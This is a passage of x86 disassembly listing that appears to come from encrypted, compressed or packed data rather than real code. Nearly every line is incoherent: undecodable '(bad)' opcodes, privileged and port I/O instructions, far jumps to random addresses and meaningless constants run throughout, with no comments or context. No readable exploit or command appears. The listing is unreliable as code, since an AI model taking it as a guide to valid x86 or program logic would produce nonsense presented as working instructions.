  41469f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146a0:	jmp    FWORD PTR [ebp+0x46]
  4146a3:	(bad)  
  4146a4:	fsubr  DWORD PTR [ecx]
  4146a6:	cwde   
  4146a7:	inc    esi
  4146a8:	cmp    dh,0xe1
  4146ab:	in     eax,0x6d
  4146ad:	add    DWORD PTR [eax+eax*8+0xe],ecx
  4146b1:	or     BYTE PTR [edi],bl
  4146b3:	push   eax
  4146b4:	dec    ebx
  4146b5:	ja     0x4146b2
  4146b7:	mov    eax,0x4e54f1b1
  4146bc:	mov    esi,0x7a008d90
  4146c1:	or     eax,0xd941cf2d
  4146c6:	sub    edx,DWORD PTR [ebx]
  4146c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146c9:	fcmovnb st,st(7)
  4146cb:	jmp    0x8ab589db
  4146d0:	iret   
  4146d1:	xchg   DWORD PTR [ebx+0x56],edx
  4146d4:	or     al,0xf5
  4146d6:	cwde   
  4146d7:	cdq    
  4146d8:	in     al,dx
  4146d9:	(bad)  
  4146da:	and    dh,BYTE PTR [eax]
  4146dc:	popf   
  4146dd:	(bad)  
  4146de:	sahf   
  4146df:	fisubr WORD PTR [edx+0x469506d3]
  4146e5:	sub    ecx,DWORD PTR [esi+0x6d7ed33e]
  4146eb:	stc    
  4146ec:	cmp    cl,bh
  4146ee:	sub    ebx,DWORD PTR [ebp+0x2a4ab349]
  4146f4:	pop    esi
  4146f5:	dec    edx
  4146f6:	rol    BYTE PTR [edi+0x393ac77f],1
  4146fc:	jg     0x414724
  4146fe:	dec    ebp
  4146ff:	pop    ds
  414700:	fstp   QWORD PTR [eax]
  414702:	sti    
  414703:	aaa    
  414704:	add    BYTE PTR [eax],0xde
  414707:	mov    eax,DWORD PTR [edx-0x41]
  41470a:	imul   ecx,DWORD PTR [edi],0xa5c99124
  414710:	push   ss
  414711:	shl    BYTE PTR [esi-0x7],0xa4
  414715:	in     eax,0x9c
  414717:	inc    edi
  414718:	xchg   DWORD PTR [ebx],ebx
  41471a:	movd   DWORD PTR [edi+0xd],mm6
  41471e:	scas   al,BYTE PTR es:[edi]
  41471f:	test   DWORD PTR [edi],ebp
  414721:	cwde   
  414722:	shr    ebp,0x1
  414725:	sub    al,dl
  414727:	fsub   QWORD PTR [edx]
  414729:	push   ecx
  41472a:	cmp    BYTE PTR ds:0xe8dcfef2,dl
  414730:	clc    
  414731:	sub    dl,BYTE PTR [ebx+0x77]
  414734:	out    0x4c,eax
  414736:	cmp    al,BYTE PTR [edi]
  414738:	test   ecx,esi
  41473a:	dec    ecx
  41473b:	(bad)  
  41473c:	call   0x69e74c9f
  414741:	adc    eax,DWORD PTR [edx-0x1c962a2a]
  414747:	adc    eax,0xcaf5ba38
  41474c:	loop   0x414723
  41474e:	adc    cl,bl
  414750:	push   ecx
  414751:	mov    dh,ch
  414753:	xor    al,0xc5
  414755:	out    0x72,eax
  414757:	mov    bl,0xe4
  414759:	push   ds
  41475a:	ja     0x41477d
  41475c:	or     al,0x3c
  41475e:	shl    DWORD PTR [edi+0x25fa2943],cl
  414764:	cmc    
  414765:	lahf   
  414766:	(bad)  
  414769:	test   bl,ch
  41476b:	call   0x4c89e382
  414770:	pop    ebx
  414771:	fwait
  414772:	jae    0x4147b6
  414774:	sti    
  414775:	dec    edi
  414776:	jnp    0x4147d4
  414778:	popf   
  414779:	out    0x8f,eax
  41477b:	lods   eax,DWORD PTR ds:[esi]
  41477d:	mov    esp,DWORD PTR ds:0x302186f3
  414783:	and    eax,0x28252d1f
  414788:	shr    DWORD PTR [eax+0x47],cl
  41478b:	push   0xffffff9c
  41478d:	mov    WORD PTR [ecx-0x5e],es
  414790:	setle  BYTE PTR [ecx]
  414793:	jmp    0xe73f6a1f
  414798:	xchg   DWORD PTR [edi-0x69f14159],edi
  41479e:	(bad)  
  41479f:	shr    DWORD PTR [ecx+eax*2],cl
  4147a2:	ficomp WORD PTR [ebp+0x47365a66]
  4147a8:	add    eax,0x40c763df
  4147ad:	mov    dl,BYTE PTR [ecx]
  4147af:	adc    ecx,DWORD PTR [eax]
  4147b1:	sub    DWORD PTR [ebx+edi*4],edx
  4147b4:	inc    edi
  4147b5:	scas   al,BYTE PTR es:[edi]
  4147b6:	stos   DWORD PTR es:[edi],eax
  4147b7:	int    0xe8
  4147b9:	jmp    0x4147c6
  4147bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147bc:	fdiv   QWORD PTR [ebp-0x2d6c7ed5]
  4147c2:	mov    dh,0x36
  4147c4:	add    al,0xb2
  4147c6:	lock mov ss:0x951a2b29,eax
  4147cd:	push   es
  4147ce:	fisttp DWORD PTR ds:0xdd25c174
  4147d4:	xchg   ecx,eax
  4147d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d6:	ins    DWORD PTR es:[edi],dx
  4147d7:	loopne 0x4147c0
  4147d9:	or     ah,bl
  4147db:	mov    ds:0xef7b864f,al
  4147e0:	inc    ebx
  4147e1:	les    ebx,FWORD PTR [ecx-0xc]
  4147e4:	push   edx
  4147e5:	inc    edi
  4147e6:	imul   edi,DWORD PTR [ecx],0x606189bd
  4147ec:	jge    0x4147e7
  4147ee:	lahf   
  4147ef:	popa   
  4147f0:	js     0x4147a9
  4147f2:	push   esi
  4147f3:	repnz bound ebx,QWORD PTR [esi+0x47]
  4147f7:	scas   al,BYTE PTR es:[edi]
  4147f8:	xchg   esp,eax
  4147f9:	imul   eax,DWORD PTR [edx],0x9b8932c2
  4147ff:	fdivr  DWORD PTR [ebx-0x64049295]
  414805:	dec    ebx
  414806:	lea    esi,[ebp+0x77]
  414809:	in     al,0x69
  41480b:	(bad)  
  41480c:	lds    ecx,FWORD PTR [ecx]
  41480e:	ror    DWORD PTR [edx],1
  414810:	jg     0x4147a0
  414812:	scas   eax,DWORD PTR es:[edi]
  414813:	mov    al,ds:0xe2a4442d
  414818:	shl    ebx,0xd0
  41481b:	xor    DWORD PTR [esi-0x59],eax
  41481e:	xchg   ebx,eax
  41481f:	icebp  
  414820:	xchg   DWORD PTR [edx+0x60],ecx
  414823:	popa   
  414824:	sub    al,0xac
  414826:	cmp    bl,dh
  414828:	xor    BYTE PTR [eax-0x8c0e262],0x2f
  41482f:	mov    ds:0x79fa78e,eax
  414834:	jg     0x41487c
  414836:	mov    bh,0x47
  414838:	enter  0xf613,0xf1
  41483c:	ret    0x1cb1
  41483f:	cmp    eax,0xfaf12c17
  414844:	mov    ah,0x79
  414846:	lahf   
  414847:	rol    DWORD PTR [di],cl
  41484a:	shl    DWORD PTR [ebx+0x5b262603],0xc6
  414851:	adc    al,0x87
  414854:	int    0x9f
  414856:	int3   
  414857:	inc    esp
  414858:	mov    ds:0xf80beaae,al
  41485d:	sub    BYTE PTR [esi],dl
  41485f:	pushf  
  414860:	push   ebx
  414861:	aaa    
  414862:	dec    esp
  414863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414864:	mov    ecx,0x21d35b42
  414869:	call   0x1a50531
  41486e:	push   0x69
  414870:	push   edx
  414871:	add    al,0x2f
  414873:	cmp    al,0xeb
  414875:	sbb    esp,ecx
  414877:	imul   esi,DWORD PTR [ebp+0x1e],0xffffffb7
  41487b:	pop    esp
  41487c:	push   0x883fce02
  414881:	xchg   BYTE PTR ds:[ebx-0x4],bh
  414885:	shrd   esp,ecx,0x22
  414889:	and    DWORD PTR [ebx-0x45],esp
  41488c:	or     DWORD PTR [esi-0x1f],0x20
  414890:	addr16 pop edi
  414892:	add    al,0xf5
  414894:	jecxz  0x414833
  414896:	ror    DWORD PTR [edi-0xc0e1024],1
  41489c:	loope  0x41487d
  41489e:	adc    eax,DWORD PTR [ebx]
  4148a0:	push   ebp
  4148a1:	xchg   esp,eax
  4148a2:	into   
  4148a3:	mov    al,ds:0x8648bd4d
  4148a8:	lods   al,BYTE PTR ds:[esi]
  4148a9:	mov    bh,0xbd
  4148ab:	fldenv [ecx]
  4148ad:	bound  edi,QWORD PTR [ebp-0xe2d630f]
  4148b3:	mov    bl,0x33
  4148b5:	daa    
  4148b6:	or     dl,BYTE PTR [ecx+0x9]
  4148b9:	or     BYTE PTR [ecx+0x30],ch
  4148bc:	xor    DWORD PTR [ecx-0x717b0df8],esp
  4148c2:	leave  
  4148c3:	jb     0x414905
  4148c5:	loope  0x414940
  4148c7:	inc    esp
  4148c8:	outs   dx,BYTE PTR ds:[esi]
  4148c9:	mov    ch,0xa3
  4148cb:	dec    ebx
  4148cc:	jge    0x414863
  4148ce:	bound  edx,QWORD PTR [edi+0x5aae84a9]
  4148d4:	mov    ch,0x3e
  4148d6:	icebp  
  4148d7:	fwait
  4148d8:	mov    al,ds:0x7bd089de
  4148dd:	add    eax,0x7bf7cf83
  4148e2:	adc    DWORD PTR [ebx+0x316f69b8],ecx
  4148e8:	data16 je 0x41488c
  4148eb:	mov    BYTE PTR [ecx+eiz*2+0x4c55312e],bh
  4148f2:	push   ecx
  4148f3:	mov    ds:0x98eb37ab,al
  4148f8:	rol    BYTE PTR [edi+0x32b9310],0x14
  4148ff:	push   0xffffffda
  414901:	repnz stos DWORD PTR es:[edi],eax
  414903:	sub    edi,DWORD PTR [edx+eiz*2-0x1a]
  414907:	ja     0x4148d5
  414909:	fisubr DWORD PTR ds:0xb2214eaa
  41490f:	push   ecx
  414910:	out    dx,eax
  414911:	adc    BYTE PTR [ecx],dh
  414913:	mov    edx,0xbd7a57d3
  414918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414919:	ins    DWORD PTR es:[edi],dx
  41491a:	sbb    al,0x9f
  41491c:	push   es
  41491d:	out    dx,eax
  41491e:	mov    ecx,0x28d570a5
  414923:	add    al,0xb8
  414925:	sahf   
  414926:	jnp    0x4148f2
  414928:	xchg   esi,esp
  41492a:	pop    esp
  41492b:	xlat   BYTE PTR ds:[ebx]
  41492c:	inc    esi
  41492d:	(bad)  
  41492e:	retf   
  41492f:	pushf  
  414930:	stos   DWORD PTR es:[edi],eax
  414931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414932:	sub    ah,al
  414934:	loope  0x414961
  414936:	push   es
  414937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414939:	xchg   DWORD PTR [ecx+edi*2-0x37],edi
  41493d:	outs   dx,BYTE PTR ds:[esi]
  41493e:	and    ah,BYTE PTR [edi+0x35]
  414941:	pop    es
  414942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414943:	mov    esi,0x518ece0f
  414948:	rol    edi,0x2
  41494b:	cdq    
  41494c:	sub    ah,BYTE PTR ds:0x27eb4a60
  414952:	sub    bl,BYTE PTR ds:0x35a51d3d
  414958:	dec    ebx
  414959:	int    0x83
  41495b:	fist   DWORD PTR [eax-0x68]
  41495e:	jb     0x414919
  414960:	jno    0x4149c8
  414962:	clc    
  414963:	popw   ss
  414965:	adc    BYTE PTR [edi],0xa0
  414968:	xchg   ebx,eax
  41496a:	mov    ds:0x9fb88a8b,ax
  414970:	je     0x4149b8
  414972:	and    eax,edx
  414974:	sahf   
  414975:	push   esi
  414976:	cmc    
  414977:	push   esp
  414978:	push   esi
  414979:	mov    es,WORD PTR [eax-0x4d00d7f2]
  41497f:	mov    ecx,0x4faa3306
  414984:	mov    dl,0xf1
  414986:	outs   dx,DWORD PTR ds:[esi]
  414987:	mov    ebp,0x8a6469d7
  41498c:	push   eax
  41498d:	dec    esp
  41498e:	std    
  41498f:	pop    es
  414990:	or     ecx,DWORD PTR [edx+edi*2-0x60]
  414994:	int3   
  414995:	stos   BYTE PTR es:[edi],al
  414996:	imul   BYTE PTR [ecx-0x21]
  414999:	mov    WORD PTR [eax+0x4a2d8c8e],cs
  41499f:	push   ss
  4149a0:	ins    DWORD PTR es:[edi],dx
  4149a1:	outs   dx,DWORD PTR ds:[esi]
  4149a2:	ss lock jns 0x4149d2
  4149a6:	jo     0x414a12
  4149a8:	dec    edi
  4149a9:	ffreep st(1)
  4149ab:	aaa    
  4149ac:	icebp  
  4149ad:	sbb    ebx,esp
  4149af:	cli    
  4149b0:	mov    WORD PTR [edx-0x1a],?
  4149b3:	push   ecx
  4149b4:	lea    edi,[esi]
  4149b6:	mov    ecx,0xc919db97
  4149bb:	stos   BYTE PTR es:[edi],al
  4149bc:	jmp    0x414955
  4149be:	dec    eax
  4149bf:	sub    ebp,edi
  4149c1:	push   ebx
  4149c2:	sbb    DWORD PTR [edx+0x179a3528],eax
  4149c8:	mov    ds:0x5ed24b88,eax
  4149cd:	fwait
  4149ce:	sub    esp,edx
  4149d0:	adc    al,0x4b
  4149d2:	aas    
  4149d3:	xchg   ebx,eax
  4149d4:	sub    al,0xe2
  4149d6:	daa    
  4149d7:	stos   DWORD PTR es:[edi],eax
  4149d8:	loop   0x4149ec
  4149da:	loopne 0x414975
  4149dc:	xchg   esi,eax
  4149dd:	jl     0x4149b1
  4149df:	cld    
  4149e0:	ja     0x414986
  4149e2:	rcr    DWORD PTR [eax-0x7d],0x36
  4149e6:	xor    ecx,DWORD PTR [esi]
  4149e8:	dec    ebx
  4149e9:	dec    eax
  4149ea:	(bad)  
  4149eb:	cli    
  4149ec:	jns    0x4149f9
  4149ee:	enter  0xedf0,0x5f
  4149f2:	or     ch,BYTE PTR [eax]
  4149f4:	push   ecx
  4149f5:	inc    BYTE PTR [eax-0x59d7123f]
  4149fb:	sub    eax,ecx
  4149fd:	jge    0x4149cc
  4149ff:	mov    bh,0xde
  414a01:	xor    BYTE PTR [ecx+0x3f08f7c7],0x8b
  414a08:	js     0x4149ff
  414a0a:	mov    bh,0x73
  414a0c:	push   ebx
  414a0d:	xor    al,0xd
  414a0f:	xchg   ecx,eax
  414a10:	push   ss
  414a11:	inc    ebx
  414a12:	cwde   
  414a13:	mov    ds:0x39c32184,eax
  414a18:	mov    ch,0x4a
  414a1a:	shl    BYTE PTR [ebx],0x60
  414a1d:	mov    edx,0x4d5bf6f4
  414a22:	dec    esi
  414a23:	or     bh,BYTE PTR [ebx+0x75]
  414a26:	test   edi,ecx
  414a28:	cmp    ebp,esi
  414a2a:	(bad)  
  414a2b:	ins    DWORD PTR es:[edi],dx
  414a2c:	jnp    0x4149b6
  414a2e:	cmc    
  414a2f:	loopne 0x414a15
  414a31:	nop
  414a32:	or     DWORD PTR [edx+ebx*2-0xe],esi
  414a36:	adc    DWORD PTR [edi-0x301f748d],ebx
  414a3c:	sub    al,BYTE PTR [eax]
  414a3e:	out    dx,al
  414a3f:	clc    
  414a40:	push   ss
  414a41:	or     DWORD PTR ss:[ebp+0x3b9b8f7a],esp
  414a48:	and    eax,0x6fd8587d
  414a4d:	outs   dx,DWORD PTR ds:[esi]
  414a4e:	gs inc esi
  414a50:	pop    ebp
  414a51:	dec    ebx
  414a52:	inc    edi
  414a53:	xchg   edx,eax
  414a54:	add    cl,BYTE PTR [esi]
  414a56:	out    dx,eax
  414a57:	adc    BYTE PTR [ecx],0x35
  414a5a:	dec    ebx
  414a5b:	test   esi,eax
  414a5d:	(bad)  
  414a5e:	in     al,dx
  414a5f:	mov    eax,ds:0xc889465
  414a64:	push   cs
  414a65:	jmp    0xb9f8:0x753fa00e
  414a6c:	repnz test BYTE PTR ds:0x9fe65a85,bl
  414a73:	mov    esp,0xf4e04500
  414a78:	or     cl,BYTE PTR ds:0x31422a95
  414a7e:	adc    eax,DWORD PTR [ecx]
  414a80:	retf   
  414a81:	mov    ds:0x6c3d2ab6,eax
  414a86:	cmp    ebx,edi
  414a88:	sub    bl,BYTE PTR [ebp-0x6ac09e9d]
  414a8e:	jle    0x414a5c
  414a90:	add    eax,0x542bdf15
  414a95:	(bad)  
  414a96:	in     al,0xa6
  414a98:	popa   
  414a99:	and    al,0x0
  414a9b:	xchg   esp,eax
  414a9c:	cmp    ch,cl
  414a9e:	out    0xee,eax
  414aa0:	fisttp QWORD PTR ds:[esi]
  414aa3:	nop
  414aa4:	mov    ebx,0x7662173a
  414aa9:	fistp  QWORD PTR ds:0xf00b7802
  414aaf:	xor    eax,0xd33503dc
  414ab4:	out    dx,eax
  414ab5:	into   
  414ab6:	add    ebx,DWORD PTR [eax+ebx*2-0x6e]
  414aba:	sbb    DWORD PTR [ecx],ebx
  414abc:	imul   ebx,DWORD PTR [edx+0x3bc07f5],0xb6a437b
  414ac6:	lea    esp,[eax]
  414ac8:	inc    edx
  414ac9:	out    dx,eax
  414aca:	jne    0x414a6e
  414acc:	cmp    ch,BYTE PTR [edx+0x23]
  414acf:	(bad)  
  414ad1:	or     edx,DWORD PTR [ebp+0x66fcdc1c]
  414ad7:	pop    ebx
  414ad8:	fild   DWORD PTR es:[edi-0x54]
  414adc:	sub    ah,BYTE PTR [edi-0x7f7bc459]
  414ae2:	inc    edx
  414ae3:	inc    edi
  414ae4:	jbe    0x414a69
  414ae6:	stos   DWORD PTR es:[edi],eax
  414ae7:	push   cs
  414ae8:	push   eax
  414ae9:	ror    BYTE PTR [ebp+0x6ac242ac],cl
  414aef:	cs fwait
  414af1:	inc    edx
  414af2:	mov    bh,0x5
  414af4:	push   esp
  414af5:	cwde   
  414af6:	les    edx,FWORD PTR [ecx+ebx*4]
  414af9:	stos   BYTE PTR es:[edi],al
  414afa:	fwait
  414afb:	rcr    BYTE PTR [ebp-0x3f],1
  414afe:	test   eax,0x22bfcc3e
  414b03:	jecxz  0x414ab7
  414b05:	aad    0xa
  414b07:	push   ebp
  414b08:	fidiv  DWORD PTR gs:[ebx]
  414b0b:	xchg   edx,eax
  414b0c:	(bad)  
  414b0d:	and    eax,0x72d557f9
  414b12:	dec    ebp
  414b13:	jmp    0xbfcc8970
  414b18:	jmp    0x27b09c5b
  414b1d:	retf   
  414b1e:	iret   
  414b1f:	dec    eax
  414b20:	scas   al,BYTE PTR es:[edi]
  414b21:	rcr    ecx,0xb1
  414b24:	gs loope 0x414b64
  414b27:	jl     0x414ab9
  414b29:	bound  edx,QWORD PTR [ecx]
  414b2b:	ret    
  414b2c:	sbb    BYTE PTR [edi+0x1],0x2d
  414b30:	inc    eax
  414b31:	les    ecx,FWORD PTR [ebx]
  414b33:	push   ecx
  414b34:	je     0x414b99
  414b36:	out    dx,al
  414b37:	cmp    edx,esp
  414b39:	pop    esi
  414b3a:	imul   ebp,DWORD PTR [edi],0x8b88a2e4
  414b40:	stos   BYTE PTR es:[edi],al
  414b41:	push   ebp
  414b42:	push   cs
  414b43:	imul   esi,DWORD PTR [esi+0x3c145349],0x71
  414b4a:	and    ebp,DWORD PTR [ebx]
  414b4c:	retf   0x2a08
  414b4f:	push   eax
  414b50:	or     DWORD PTR [esi+0x14717dd8],ecx
  414b56:	ror    BYTE PTR [eax],0x8b
  414b59:	shl    BYTE PTR [edx],cl
  414b5b:	and    al,0x93
  414b5d:	iret   
  414b5e:	mov    ebp,0xe8338fc4
  414b63:	mov    bh,0x36
  414b65:	mov    eax,ds:0x83f113ff
  414b6a:	pusha  
  414b6b:	loop   0x414af4
  414b6d:	mov    dh,0xa2
  414b6f:	retf   0xbfca
  414b72:	data16 lock adc BYTE PTR [eax-0xa],bh
  414b77:	loopne 0x414afd
  414b79:	push   ebx
  414b7a:	es mov ah,0x8e
  414b7d:	lods   eax,DWORD PTR ds:[esi]
  414b7e:	and    dh,ch
  414b80:	mov    al,ds:0x6518979
  414b85:	and    BYTE PTR [edi+0x4c76e39d],bl
  414b8b:	jmp    0xf02f:0x7ad8a949
  414b92:	out    0xfa,eax
  414b94:	lods   al,BYTE PTR ds:[esi]
  414b95:	mov    bl,0x81
  414b97:	stos   DWORD PTR es:[edi],eax
  414b98:	mov    WORD PTR [ebp-0x7d],fs
  414b9b:	adc    al,0xd9
  414b9d:	jmp    0x414be5
  414b9f:	imul   esp,esi,0xfffffff1
  414ba2:	xchg   ebp,eax
  414ba3:	dec    ecx
  414ba4:	ss daa 
  414ba6:	and    edi,DWORD PTR [eax]
  414ba8:	xchg   ebx,eax
  414ba9:	test   eax,0x586e8750
  414bae:	loope  0x414c26
  414bb0:	push   ebx
  414bb1:	imul   ecx,ebx,0x22
  414bb4:	mov    ch,0xc7
  414bb6:	jg     0x414c25
  414bb8:	adc    esi,edx
  414bba:	div    DWORD PTR [ebx+0x32e950b8]
  414bc0:	mov    ebx,0x2e732426
  414bc5:	pop    ebx
  414bc6:	mov    cl,0xfd
  414bc8:	mov    WORD PTR [ebp+0x6da7fab3],cs
  414bce:	add    al,0x43
  414bd0:	mov    dl,0x4e
  414bd2:	cli    
  414bd3:	rsm    
  414bd5:	hlt    
  414bd6:	cmp    cl,ch
  414bd8:	daa    
  414bd9:	xor    DWORD PTR [esi],eax
  414bdb:	adc    BYTE PTR [edx+0xd814109],ch
  414be1:	add    eax,0xb4745328
  414be6:	cmp    BYTE PTR [esi+0x24],cl
  414be9:	push   eax
  414bea:	add    eax,0x93d0248d
  414bef:	jns    0x414c07
  414bf1:	cmp    eax,0x340facc5
  414bf6:	and    ebx,ebx
  414bf8:	sbb    ah,BYTE PTR [edi+0x19c4c4b0]
  414bfe:	push   0xfffffffe
  414c00:	mov    esi,0x184d6e0a
  414c05:	dec    edx
  414c06:	push   0x51aa3088
  414c0b:	mov    DWORD PTR [ecx+0x4d],eax
  414c0e:	fscale 
  414c10:	loop   0x414c49
  414c12:	dec    esi
  414c13:	arpl   WORD PTR [ebp+0x24],cx
  414c16:	add    DWORD PTR [edx-0x48],ebx
  414c19:	cmc    
  414c1a:	sbb    DWORD PTR [edi-0x1a],eax
  414c1d:	ds add al,0x9a
  414c20:	and    DWORD PTR [edx+eiz*1+0xb71ed58],0x88e7c3b1
  414c2b:	sti    
  414c2c:	and    ecx,DWORD PTR [edx-0x7764df04]
  414c32:	retf   0x86c
  414c35:	pop    ebp
  414c36:	xor    bh,0x6f
  414c39:	mov    eax,0xaa9a7540
  414c3e:	push   edx
  414c3f:	pop    eax
  414c40:	or     BYTE PTR [edi+0x4d],dh
  414c43:	sahf   
  414c44:	daa    
  414c45:	cmc    
  414c46:	sub    ebp,DWORD PTR [ebx]
  414c48:	xchg   edx,eax
  414c49:	ins    BYTE PTR es:[edi],dx
  414c4a:	mov    ds:0x9bc35baa,eax
  414c4f:	push   ss
  414c50:	fistp  WORD PTR [ebx]
  414c52:	imul   ecx,DWORD PTR [ebp+0x18],0x197a222d
  414c59:	dec    eax
  414c5a:	fwait
  414c5b:	dec    ebx
  414c5c:	pop    eax
  414c5d:	outs   dx,BYTE PTR ds:[esi]
  414c5e:	(bad)  
  414c5f:	push   edx
  414c60:	jmp    0x414c4b
  414c62:	nop    DWORD PTR [edx]
  414c65:	xor    edx,DWORD PTR [edi+eax*8]
  414c68:	dec    ebp
  414c69:	test   eax,0xc44a1e5f
  414c6e:	dec    esp
  414c6f:	bound  ebx,QWORD PTR [esi+ebx*1-0xe014913]
  414c76:	push   0x44240a19
  414c7b:	jne    0x414c1b
  414c7d:	xchg   esi,eax
  414c7e:	xchg   bl,dl
  414c80:	inc    ebp
  414c81:	adc    bl,bh
  414c83:	xor    edx,edx
  414c85:	js     0x414c28
  414c87:	cmc    
  414c88:	std    
  414c89:	les    ecx,FWORD PTR [eax+0x4e62c9de]
  414c8f:	mov    ecx,0x7d222f28
  414c94:	test   esp,esp
  414c96:	retf   0x9469
  414c99:	sub    cl,al
  414c9b:	mov    bl,0x66
  414c9d:	test   BYTE PTR [ebx+ebp*1+0x28a3cd36],dh
  414ca4:	and    al,0xaf
  414ca6:	push   edi
  414ca7:	pushf  
  414ca8:	les    ecx,FWORD PTR [edx+0x61]
  414cab:	cdq    
  414cac:	leave  
  414cad:	mov    al,ds:0xb394d170
  414cb2:	push   ebp
  414cb3:	fcmovnbe st,st(5)
  414cb5:	sub    DWORD PTR [eax+0x11],esp
  414cb8:	out    dx,eax
  414cb9:	popf   
  414cba:	(bad)  
  414cbc:	xchg   edi,eax
  414cbd:	ret    0x5bb4
  414cc0:	cmp    DWORD PTR [ebp-0x62],esp
  414cc3:	push   ecx
  414cc4:	jg     0x414c68
  414cc6:	les    ecx,FWORD PTR [ecx]
  414cc8:	sbb    al,0x34
  414cca:	cwde   
  414ccb:	mov    WORD PTR [ecx-0x9],gs
  414cce:	jl     0x414c51
  414cd0:	ret    
  414cd1:	pop    es
  414cd2:	fsubr  QWORD PTR [esi-0x396f0505]
  414cd8:	stos   BYTE PTR es:[edi],al
  414cd9:	mov    BYTE PTR [ecx-0x5f],bl
  414cdc:	ins    BYTE PTR es:[edi],dx
  414cdd:	mov    ds:0xe25b69d3,eax
  414ce2:	sar    BYTE PTR [edi+0x59],cl
  414ce5:	(bad)  
  414ce6:	gs push 0x27
  414ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cea:	dec    edx
  414ceb:	xor    BYTE PTR [esi-0x7b],bl
  414cee:	rol    DWORD PTR [eax+ebx*8+0x36a86ad8],cl
  414cf5:	sbb    DWORD PTR [eax-0x345989e],esi
  414cfb:	add    eax,0x8d840b98
  414d00:	clc    
  414d01:	mov    al,0x3e
  414d03:	dec    eax
  414d04:	test   BYTE PTR [eax],ah
  414d06:	push   ecx
  414d07:	pusha  
  414d08:	push   ss
  414d09:	fwait
  414d0a:	(bad)  
  414d0c:	retf   
  414d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d0e:	jo     0x414d4d
  414d10:	dec    ecx
  414d11:	fisttp DWORD PTR [edx+0x5aaa7831]
  414d17:	mov    edx,0x181fbf6b
  414d1c:	pop    esp
  414d1d:	push   edi
  414d1e:	jnp    0x414d49
  414d20:	push   esi
  414d21:	sub    eax,0xf46aecf8
  414d26:	shr    BYTE PTR [esp+edi*4+0x37],1
  414d2a:	stos   DWORD PTR es:[edi],eax
  414d2b:	jno    0x414cf9
  414d2d:	lock fiadd DWORD PTR [ebx+0x710b979c]
  414d34:	or     DWORD PTR [ecx+0x457c754a],ecx
  414d3a:	push   edx
  414d3b:	fdivr  DWORD PTR [eax+0x63]
  414d3e:	sbb    cl,BYTE PTR [eax]
  414d40:	pop    ebx
  414d41:	sahf   
  414d42:	daa    
  414d43:	fiadd  DWORD PTR [eax+0x4e3dc39d]
  414d49:	xchg   edi,eax
  414d4a:	jmp    0x88b7:0x9d598c72
  414d51:	popa   
  414d52:	int3   
  414d53:	add    ch,ah
  414d55:	push   esi
  414d56:	mov    ch,ch
  414d58:	inc    edx
  414d59:	stos   DWORD PTR es:[edi],eax
  414d5a:	sbb    al,0xc1
  414d5c:	pop    ebx
  414d5d:	inc    edi
  414d5e:	mov    bl,BYTE PTR [eax+ecx*1+0x14178c2e]
  414d65:	shl    BYTE PTR [edi],cl
  414d67:	add    edx,DWORD PTR [edx-0x11]
  414d6a:	jp     0x414d7c
  414d6c:	inc    ebx
  414d6d:	gs pop ds
  414d6f:	xchg   ecx,eax
  414d70:	xor    eax,DWORD PTR [edx]
  414d72:	shr    DWORD PTR [esi+0x46],cl
  414d75:	xchg   edi,esp
  414d77:	dec    ebx
  414d78:	mov    ebx,0x52a5059f
  414d7d:	add    al,0xe8
  414d7f:	push   esp
  414d80:	add    edi,ebx
  414d82:	inc    esi
  414d83:	and    DWORD PTR [ecx+0x2b],ebp
  414d86:	sub    ecx,DWORD PTR [ecx-0x3eedc678]
  414d8c:	adc    DWORD PTR [edi+0x41],0xdf9d721d
  414d93:	mov    al,ds:0xd4159b71
  414d98:	neg    DWORD PTR [ecx+edi*1+0x142078a1]
  414d9f:	inc    ebx
  414da0:	pop    DWORD PTR [ecx]
  414da2:	test   BYTE PTR [esi+0xf],cl
  414da5:	gs xchg edx,eax
  414da7:	sbb    eax,0xc3fdef88
  414dac:	push   edx
  414dad:	pop    ds
  414dae:	pop    esp
  414daf:	aaa    
  414db0:	and    al,0x4c
  414db2:	dec    esi
  414db3:	sahf   
  414db4:	je     0x414de4
  414db6:	idiv   DWORD PTR [esi]
  414db8:	cmp    al,0x2e
  414dba:	fxch   st(0)
  414dbc:	in     eax,dx
  414dbd:	xor    dl,BYTE PTR [eax-0x25]
  414dc0:	adc    DWORD PTR [ebx-0x6f3194c3],ecx
  414dc6:	js     0x414d6e
  414dc8:	adc    dh,BYTE PTR [edi]
  414dca:	or     dh,BYTE PTR [edi]
  414dcc:	add    dh,cl
  414dce:	int    0x4b
  414dd0:	xor    BYTE PTR [ebx-0x1d],0xf
  414dd4:	int3   
  414dd5:	outs   dx,DWORD PTR ds:[esi]
  414dd6:	jnp    0x414dbf
  414dd8:	enter  0x17d2,0x90
  414ddc:	pop    eax
  414ddd:	jne    0x414e49
  414ddf:	nop
  414de0:	stos   DWORD PTR es:[edi],eax
  414de1:	sbb    bh,0xa6
  414de4:	(bad)  
  414de5:	mov    eax,0x788a171c
  414dea:	retf   
  414deb:	icebp  
  414dec:	int    0x68
  414dee:	out    dx,eax
  414def:	inc    edx
  414df0:	leave  
  414df1:	test   DWORD PTR [ebx+0x64de0923],edi
  414df7:	mov    dl,0x11
  414df9:	shr    bl,1
  414dfb:	pop    ds
  414dfc:	mov    ch,0xcb
  414dfe:	mov    bl,0xf6
  414e00:	sbb    al,0x53
  414e02:	cs dec ecx
  414e04:	into   
  414e05:	in     al,dx
  414e06:	adc    eax,0x377143ea
  414e0b:	and    DWORD PTR [ecx],ebp
  414e0d:	push   eax
  414e0e:	in     eax,dx
  414e0f:	jne    0x414db9
  414e11:	inc    ebp
  414e12:	xor    al,0xcb
  414e14:	jp     0x414e3b
  414e16:	dec    ebp
  414e17:	xchg   ecx,eax
  414e18:	rol    DWORD PTR [ecx+0x345c067],1
  414e1e:	sbb    ah,BYTE PTR [ecx-0x36e59fd7]
  414e24:	sub    ebx,ebp
  414e26:	pop    esi
